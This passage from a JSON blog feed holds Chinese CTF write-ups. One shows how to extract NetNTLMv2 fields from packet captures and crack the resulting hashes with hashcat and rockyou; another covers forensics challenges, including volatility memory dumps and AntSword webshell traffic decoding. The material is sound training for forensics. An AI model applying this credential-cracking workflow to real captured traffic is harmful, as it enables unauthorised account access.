Pocsuite 框架还不是太熟悉，需要进一步地去使用和研究才能获得更多更好的感悟</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NTLM%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "url": "https://nnnpc.github.io/2024/04/16/NTLM%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "title": "NTLM协议流量解密",
            "date_published": "2024-04-16T05:58:19.017Z",
            "content_html": "<h1 id=\"例一\"><a class=\"markdownIt-Anchor\" href=\"#例一\">#</a> 例一：</h1>\n<p>近期做到一道 NTLM 协议的流量题，第一次进行解密，记录一下</p>\n<p>解密该协议的流量，其实就是得到用户名的密码，需要寻找一些字段信息并用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response </span><br></pre></td></tr></table></figure>\n<p>先进行过滤：ntlmssp</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GVJwR28aDugcmZ5Z.png!thumbnail\" alt=\"\"></p>\n<p>找到 NTLMSSP_AUTH 包，得到 domain name 和 user name</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/86wHbcx3hzyDMEP9.png!thumbnail\" alt=\"\"></p>\n<p>追踪 NTLM response，可以得到 NTproofstring 和 modifiedntlmv2response</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6ikrvW90lTRU45Xu.png!thumbnail\" alt=\"\"></p>\n<p>这里 modifiedntlmv2response 开头部分包括了 NTproofstring 的值，组成的时候需要删除重复部分</p>\n<p>接着寻找 ServerChallenge，过滤 ntlmssp.ntlmserverchallenge</p>\n<p>找到符合条件的包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Q5T0wy90FUlhEak2.png!thumbnail\" alt=\"\"></p>\n<p>将得到的手动组成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">administrator:::1166026a7745c2d0:971356880954f778c48937ad52ccae51:01010000000000005a308cd161f7d8016092111fede1fd960000000002001e004400450053004b0054004f0050002d004a0052005500510045003900360001001e004400450053004b0054004f0050002d004a0052005500510045003900360004001e004400450053004b0054004f0050002d004a0052005500510045003900360003001e004400450053004b0054004f0050002d004a00520055005100450039003600070008005a308cd161f7d80106000400020000000800300030000000000000000100000000200000a2fc8de06e3dff62c01429115953f2f8ea32e069bc69837a7b03ee0112ca689a0a0010000000000000000000000000000000000009001c0063006900660073002f003100320037002e0030002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>\n<p>使用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 hash.txt passwords.txt -o out.txt --force</span><br><span class=\"line\">#hash.txt中是组成的内容，password.txt是字典（在该附件中进行分段传输，利用原始数据提取出来就好），-o参数表示将结果存储到out.txt文本当中</span><br><span class=\"line\">./hashcat.exe -m 5600 hash.txt passwords.txt --show</span><br><span class=\"line\">#如果已经爆破就使用--show展示出来</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6sZRgp60VShOHJmN.png!thumbnail\" alt=\"\"></p>\n<p>得到最终的密码 @Aa123456789</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2doLWJhbHRoYXphcmJyYXR0L25vY2FzaHZhbHVl\">https://github.com/gh-balthazarbratt/nocashvalue</span></p>\n<p>该脚本也可以自动提取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./main.py --tshark_path /usr/bin/tshark --pcap_file NTLM.pcapng</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7Ur6g4fjiJtVN53F.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fC8FuuWxvXV3QmQH.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3j0QhBFizJCq9Ek5.png!thumbnail\" alt=\"\"></p>\n<p>但是脚本提取也有些问题，最后一个字段值开头会少一位，需要自己手动加一个 0，并且 NULL 处不需要填写，手动删除</p>\n<h1 id=\"例二\"><a class=\"markdownIt-Anchor\" href=\"#例二\">#</a> 例二：</h1>\n<p>拿最近的 geek challenge 的一道不太一样的题目再次来进行详细说明</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjCsftpPeqPC8UDd.png!thumbnail\" alt=\"\"></p>\n<p>拿到流量包追踪一下 tcp 流，结合题目可以知道</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Bk9XBs7Cd97DHNAH.png!thumbnail\" alt=\"\"></p>\n<p>这是内网通信的流量，并且使用了 NTLM 验证身份的方式，上网搜索了一下该验证方式的工作流程，大致为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.首先客户端在本地加密当前用户的密码成hash</span><br><span class=\"line\">2.客户端向服务端发送账号，这里进行了明文传输</span><br><span class=\"line\">3.服务端确认了NTLM认证方式，并随机生成了16位的字符串作为challenge发送给了客户端</span><br><span class=\"line\">4.客户端再用生成的hash加密该challenge发送回服务端作为response</span><br><span class=\"line\">5.服务端再把用户名，challenge和response发送给域控制器</span><br><span class=\"line\">6.域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，并同样加密challenge</span><br><span class=\"line\">7.比较两个加密后的challenge，如果相同则认证成功</span><br></pre></td></tr></table></figure>\n<p>接下来回看这道题目，既然是截获了通讯流量那么也就是说客户端和服务端所进行的一些通信数据都直接被截获了，根据题目要求，要找到用户的密码。根据工作流程可以知道，hashcat 爆破用户密码所需要的一些字段信息都能被流量所捕获到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pNucLoAZNeu76EEx.png!thumbnail\" alt=\"\"></p>\n<p>并且通过最后一个返回包中的对话信息可以知道密码字典为 rockyou，接下来寻找到需要的字段就可以开始进行爆破了，以下为需要寻找的字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mVGJwwn0vCW3Btiu.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mpmcyKvrKJNaO6NN.png!thumbnail\" alt=\"\"></p>\n<p>过滤 ntlmssp.ntlmserverchallenge 能找到 challenge 字段信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bDBpfIq4o1HmUWFv.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>\n<p>将得到的字段值拼接利用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 1.txt rockyou.txt -o out.txt --force</span><br></pre></td></tr></table></figure>\n<p>在 out.txt 中得到爆破出的密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lURCG5lq2sLKO7uO.png!thumbnail\" alt=\"\"></p>\n<p><strong>SYC{iamjackspassword}</strong></p>\n<h1 id=\"例三\"><a class=\"markdownIt-Anchor\" href=\"#例三\">#</a> 例三：</h1>\n<p>接下来用另一道题更深入地剖析一下 NTLM 协议传输字段值的组成，同样来自 geek<br>\nchallenge</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/D7jn883rE2SNW2Lg.png!thumbnail\" alt=\"\"></p>\n<p>该题抓取了用户进行邮箱登录的 SMTP 协议流量，并选择了 NTLM 的认证方式，所以本质上的考点还是通过 NTLM 协议的流量寻找字段进行组合爆破 hash</p>\n<p>浅浅了解一下 SMTP 通讯协议吧</p>\n<p>该协议是一个简单的邮件传送协议，用下图来进行说明</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9wMVKsPkEMymr6nS.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.用户在用户代理中编辑邮件信息，包括发件人邮箱标题等等</span><br><span class=\"line\">2.用户代理提取用户编辑的信息，生成一封符合邮件格式标准（RFC822）的邮件</span><br><span class=\"line\">3.用户代理利用SMTP协议将邮件发送给发送端的邮件服务器</span><br><span class=\"line\">4.发送端的邮件服务器同样通过SMTP协议将邮件发送给接收端的邮件服务器</span><br><span class=\"line\">5.接收端的用户代理利用POP3协议从接收端服务器取回邮件</span><br><span class=\"line\">6.用户代理端接收邮件并解析读取</span><br></pre></td></tr></table></figure>\n<p>看回本题，本题并没有进行邮件收发的操作，截取的是登录邮件服务器认证过程的流量<br>\n<strong>首先是客户端对邮件服务器的 25 端口进行的三次握手</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/g2YID2WJGS4p7g8X.png!thumbnail\" alt=\"\"></p>\n<p><strong>握手成功后服务端会主动向客户端发送准备就绪的信息</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8sEYKHwWAjKi6BKa.png!thumbnail\" alt=\"\"></p>\n<blockquote>\n<p>网易邮箱一般都形如 &quot;220 <span class=\"exturl\" data-url=\"aHR0cDovLzE2My5jb20=\">163.com</span> Anti-spam GT for Coremail System<br>\n (163com [20111010])&quot;；QQ 邮箱形如&quot;220 <span class=\"exturl\" data-url=\"aHR0cDovL3NtdHAucXEuY29t\">smtp.qq.com</span> Esmtp QQ Mail<br>\nServer&quot;；Google 邮箱形如&quot;220 <span class=\"exturl\" data-url=\"aHR0cDovL214Lmdvb2dsZS5jb20=\">mx.google.com</span> ESMTP<br>\nnw8sm917193igc.7&quot;。其中 220 代表服务就绪，每一条服务就绪信息以&quot;rn&quot; 为结尾标示符。</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7Rvww53De6hWB1yt.png!thumbnail\" alt=\"\"></p>\n<p><strong>接着客户端向 SMTP 服务器交代自己的身份，也就是机器名（DESKTOP-xxxxxxx）</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yJk8GuhPiaFjh2Er.png!thumbnail\" alt=\"\"></p>\n<p><strong>身份认证通过后，服务器会进入等待认证状态，会主动推送所有支持的 SMTP 认证方式</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Nl9HXxe6Y4tmXnLe.png!thumbnail\" alt=\"\"></p>\n<p><strong>接下来就是客户端进行选择认证方式进行认证</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/88apimQEgweC3Blg.png!thumbnail\" alt=\"\"></p>\n<p><strong>直到 235 2.7.0 Authentication successful，认证成功</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/P73K5cN5E2o9DWzV.png!thumbnail\" alt=\"\"></p>\n<p>数据包分析结束，看看题目，本题中该数据包清晰的显示了一整个身份校验以及认证的流程，这里可以看到客户端选择的认证方式是 NTLM，NTLM 的认证方式和 login 差不多，根据上面题目可以知道，既然是 NTLM 协议进行认证，那么密码给出的是 hash 值来进行加密和传输，因此需要构造字段值进行 hash 爆破</p>\n<p>但是本题的 wireshark 当中并没有直接显示出各个字段的值方便确认，只显示出了原始的 base64 编码，猜测原因是之前是直接通过 NTLM 协议认证进行内网通信，而这里是登录邮件服务器选择了支持 SMTP 的 NTLM 协议认证方式，所以 wireshark 并没有解析出字段值</p>\n<p>无妨，自己对照着数据包去解码寻找对应的数据块吧</p>\n<p>把大小为 420 和 789 的两个数据包解码后转为 16 进制</p>\n<p>发现在大小为 420 的数据包中，24 字节头部数据之后的 8 字节数据便是 ServerChallenge 字段</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NKGtEU1biVhn7fEc.png!thumbnail\" alt=\"\"></p>\n<p>接下来解析大小为 789 的数据包获得剩余字段值</p>\n<p>88 字节数据之后跟着的是 domainname 和 username（根据之前题目的数据包来看，domain<br>\nname 和 username 字段数据也是挨着的）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/37oHMH99cS9bMUk8.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EnaZCTJopkyLupBH.png!thumbnail\" alt=\"\"></p>\n<p>根据题目所述，username 为 jack，因此为下图的 8 字节数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RrN6m7D1nxMrniEg.png!thumbnail\" alt=\"\"></p>\n<p>接下来间隔 client01 字段，这里有 40 字节数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UVpBmy5pntuY3AFT.png!thumbnail\" alt=\"\"></p>\n<p>从该字段结束部分到末尾的 16 字节数据之前为 NTLMv2 Response 数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LhU7iqKb2Ux78p91.png!thumbnail\" alt=\"\"></p>\n<p>可以知道的是 NTLMv2 Response 数据头部的 16 字节数据便是 NTProofStr 数据</p>\n<p>到这为止已经剖析到我们爆破所需的所有数据了，整合一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</span><br></pre></td></tr></table></figure>\n<p>这里的 domain<br>\nname 不止可以通过在 NTLM 认证过程中获得，其实就是之前所说的 SMTP 通讯过程中客户端向邮件服务器发送的机器名称<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dU7RQs7tmPaVAEUF.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这里有一个需要注意的点，domain<br>\nname 的大小写必须按照给出的大小写来填入，不能改动</p>\n<p>接下来就是熟悉的 hash 爆破了，利用 rockyou 字典进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 10.txt rockyou.txt -o out1.txt --force</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9s2OYOfWjwPykhJk.png!thumbnail\" alt=\"\"></p>\n<p>得到密码 jack100589barney，便是 flag</p>\n<p><strong>SYC{jack100589barney}</strong></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK5/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK5/",
            "title": "NewStarCTF2023Misc week5",
            "date_published": "2024-04-16T05:58:19.015Z",
            "content_html": "<h1 id=\"week5\"><a class=\"markdownIt-Anchor\" href=\"#week5\">#</a> <strong>WEEK5</strong></h1>\n<h2 id=\"隐秘的图片\"><a class=\"markdownIt-Anchor\" href=\"#隐秘的图片\">#</a> 隐秘的图片</h2>\n<p>解压附件，得到 key1，key2 两张图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YGcEbbu12NsSNUD9.png!thumbnail\" alt=\"\"></p>\n<p>key1 扫出来并不是 flag</p>\n<p>大致看了下，发现 key2 很奇怪，并不像拼接定位点，而黑白两部分并不需要 xor</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/myep5P3UAZl2W8dk.png!thumbnail\" alt=\"\"></p>\n<p>两张图片的大小是相同的，所以猜测一下使用 stegsolve 进行合并</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/chJDGvOGReext6uK.png!thumbnail\" alt=\"\"></p>\n<p>xor 得到完整二维码。扫码得到 flag</p>\n<p><strong>flag{x0r_1m4ge_w1ll_g0t_fl4ggg_3394e4ecbb53}</strong></p>\n<h2 id=\"ezhard\"><a class=\"markdownIt-Anchor\" href=\"#ezhard\">#</a> ezhard</h2>\n<p>是一道磁盘取证题，这题我没用别的工具就单用了 winhex</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/b2DnQBCemRwg8d9R.png!thumbnail\" alt=\"\"></p>\n<p>发现 lost+found 处有 flag 和 hint.png，于是用 binwalk 对文件进行分离</p>\n<p>能直接在 hint.png 获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UeODlBCxl8SzaGE5.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{12bc2ba3-fa54-7b45-7f3d-f54ea6e45d7c}</strong></p>\n<h2 id=\"新建python文件\"><a class=\"markdownIt-Anchor\" href=\"#新建python文件\">#</a> 新建 Python 文件</h2>\n<p>当时第一次看题的时候第一反应就是反编译，结果没有什么发现，就是一个普通的脚本</p>\n<p>这题的考点在于剑龙隐写（stegosaurus），也是比较老的一个考点了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FuZ2VsS2l0dHkvc3RlZ29zYXVydXM=\">https://github.com/AngelKitty/stegosaurus</span></p>\n<p>这题对 python 的版本好像有一定的要求，需要 3.6 的环境，本机是 3.1 的所以当时跑了下直接报错也就没再返回看了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uC42SmtK3PJXdYdM.png!thumbnail\" alt=\"\"></p>\n<p>跑一下就能出</p>\n<p><strong>flag{s0_b4By_pYcst3g}</strong></p>\n<h2 id=\"babyantsword\"><a class=\"markdownIt-Anchor\" href=\"#babyantsword\">#</a> BabyAntSword</h2>\n<p>看题目就知道是蚁剑的流量题</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OsYZoVejKJVK48yJ.png!thumbnail\" alt=\"\"></p>\n<p>无非就是解密请求包与回显包，先看看流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wAMgdNAILEWyqdZX.png!thumbnail\" alt=\"\"></p>\n<p>在第 31 流开始明显出现了蚁剑 webshell 的流量特征</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UNm9JrvaVx96sjSx.png!thumbnail\" alt=\"\"></p>\n<p>在第 36 流出现了命令执行语句，并且多出了第二个字段，参数为 n3wst4r</p>\n<p>这便是 webshell 的密码</p>\n<p>而执行的命令解码便知道是 whoami</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pMEpy2peT2OA5lxp.png!thumbnail\" alt=\"\"></p>\n<p>第 39 流的回显明显较多，去除头尾解码查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/apZqxqvyy5xBlENE.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Dz2ZPUxPBV9iv2wv.png!thumbnail\" alt=\"\"></p>\n<p>在这里找到了 java 的版本</p>\n<p>在解码 43 流回包时发现了一个 uuid，猜测为需要寻找的最后一个信息，去查看下请求包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/r7Rk18vo68DVrLop.png!thumbnail\" alt=\"\"></p>\n<p>发现文件名称为 secret，再查看下下个流的请求包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/juUJXaaKGTd783U4.png!thumbnail\" alt=\"\"></p>\n<p>发现把该文件删除了，确定了这便是需要寻找的内容，拼接得到 flag</p>\n<p><strong>flag{n3wst4r_7u121_c5850a0c-dc03-1db2-4303-43d6fdf27985}</strong></p>\n<h2 id=\"easymem\"><a class=\"markdownIt-Anchor\" href=\"#easymem\">#</a> Easymem</h2>\n<p>是一道平时比较常见知识点的内存取证题，这里用到工具 vol2，PasswareKitForensic 和 gimp</p>\n<p>先用 imageinfo 查看类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw imageinfo</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wC7ms9O3Wx2nSkC1.png!thumbnail\" alt=\"\"></p>\n<p>再查找名称带有 flag 字段的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 filescan | findstr flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Mckm3NA1bVMwHDb1.png!thumbnail\" alt=\"\"></p>\n<p>发现桌面上有个 flag2.txt，给它 dump 下来得到第二段 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ed627e0 -D ./</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mXDfJ0c4Bh1r96gc.png!thumbnail\" alt=\"\"></p>\n<p>83-5032-1056-</p>\n<p>接着使用 PasswareKitForensic 去爆破用户密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EPG5LcH8xbmT5LS9.png!thumbnail\" alt=\"\"></p>\n<p>可以得到 ctf 用户的密码为第一段 flag，flag {45a527fb-2f</p>\n<p>接着还剩最后一段 flag，根据前面几周的经验，notepad 和 editbox 都查看了，发现没有东西，去看看画板的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 pslist | findstr mspaint</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ahq7VTHHAQ0iNycd.png!thumbnail\" alt=\"\"></p>\n<p>先找到画板的进程号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f 3.raw --profile=Win7SP1x64 memdump -p 1484 --dump-dir=./</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lA55hifHb2Wz9LJr.png!thumbnail\" alt=\"\"></p>\n<p>接着使用 memdump，dump 它内存进程的转储文件，得到 1484.dmp，改后缀为 data 拖入 gimp 固定好常用宽高拉取位移使图像清晰可见</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jNwgUu1TnZG6yQ7K.png!thumbnail\" alt=\"\"></p>\n<p>得到最后一段 flag，这里可以切换高度和宽度重新位移试试，我这里的数据得到的就是镜像图片，在线网站翻转一下就能看了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jJHGlE31jeJ1EhK7.png!thumbnail\" alt=\"\"></p>\n<p>拼接得到完整 flag</p>\n<p><strong>flag{45a527fb-2f83-5032-1056-0b949b63a947}</strong></p>\n<h2 id=\"enigma\"><a class=\"markdownIt-Anchor\" href=\"#enigma\">#</a> Enigma</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install py-enigma</span><br></pre></td></tr></table></figure>\n<p>这题没做出来，附上官方脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from enigma.machine import EnigmaMachine</span><br><span class=\"line\">reflectors = [&#x27;B-Thin&#x27;, &#x27;C-Thin&#x27;]</span><br><span class=\"line\">rotors = [&#x27;I&#x27;, &#x27;II&#x27;, &#x27;III&#x27;, &#x27;IV&#x27;, &#x27;V&#x27;, &#x27;VI&#x27;, &#x27;VII&#x27;, &#x27;VIII&#x27;]</span><br><span class=\"line\">for r1, r2, r3 in [(r1, r2, r3) for r1 in rotors for r2 in rotors for r3 in rotors]:</span><br><span class=\"line\">    for r in reflectors:</span><br><span class=\"line\">        for a, b in [(a, b) for a in range(1, 26) for b in range(1, 26)]:</span><br><span class=\"line\">            machine = EnigmaMachine.from_key_sheet(</span><br><span class=\"line\">                rotors=&#x27; &#x27;.join([r1, r2, r3]),</span><br><span class=\"line\">                reflector=r,</span><br><span class=\"line\">                ring_settings=[a, 15, b],</span><br><span class=\"line\">                plugboard_settings=&#x27;&#x27;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            temp = machine.process_text(&#x27;uwdhwalkbuzwewhcaaepxnqsvfvkohskkspolrnswdfcbnn&#x27;)</span><br><span class=\"line\">            if temp.startswith(&quot;FLAG&quot;):</span><br><span class=\"line\">                print(temp, r1, r2, r3, r)</span><br><span class=\"line\">                break</span><br></pre></td></tr></table></figure>\n<p>去了解了一下 enigma 是二战时期的德国密码机，其实只要知道本题中有几个未知的加密参数：reflector、rotors 和 rs1、rs2，去根据他们原有的范围编写脚本爆破密文即可<br>\n得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/so7EtI1kKl0NRt3U.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{ENIGMAISSOOOINTERESTINGCRYPTODOYOUTHINKSO}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK4/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK4/",
            "title": "NewStarCTF2023Misc week4",
            "date_published": "2024-04-16T05:58:19.013Z",
